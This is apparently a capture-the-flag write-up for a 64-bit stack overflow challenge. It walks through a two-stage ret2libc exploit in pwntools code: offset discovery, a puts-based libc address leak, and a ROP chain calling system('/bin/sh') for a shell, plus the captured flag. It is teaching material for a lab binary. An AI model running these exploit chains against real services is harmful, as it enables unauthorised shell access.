---
title: "Binary Exploitation: ret2libc on 64-bit"
date: 2024-11-01
description: "Stack buffer overflow into ret2libc — leak libc base via puts, calculate system() offset, pop shell."
category: "Binary Exploitation"
ctf: "ISFCR CryoVault Finals"
difficulty: "Hard"
points: 600
tags: ["pwn", "ret2libc", "rop", "pwntools", "64bit"]
---

## Challenge Overview

A 64-bit ELF with NX enabled, no stack canary, partial RELRO. The binary reads up to 256 bytes into a 64-byte buffer.

## Solution

### Step 1: Find the offset

```python
from pwn import *
p = process('./vuln')
p.sendline(cyclic(200))
p.wait()
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 4))
print(f"Offset: {offset}")  # 72
```

### Step 2: Leak libc base via puts

```python
elf  = ELF('./vuln')
libc = ELF('./libc.so.6')
rop  = ROP(elf)

pop_rdi   = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    b'A' * 72,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']   # return to main for second stage
)
p.sendline(payload)
p.recvline()
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']
print(f"libc @ {hex(libc.address)}")
```

### Step 3: Call system("/bin/sh")

```python
payload2 = flat(
    b'A' * 72,
    ret_gadget,            # stack alignment
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.symbols['system']
)
p.sendline(payload2)
p.interactive()
```

```
$ cat flag.txt
FLAG{r3t2l1bc_64b1t_st4ck_sm4sh3d}
```

## Flag

`FLAG{r3t2l1bc_64b1t_st4ck_sm4sh3d}`

## Key Takeaways

The two-stage approach — leak then ret — is the canonical 64-bit ret2libc technique. Always check stack alignment (16-byte boundary before `call`) on x86-64 or `system()` will SIGSEGV inside `movaps`.
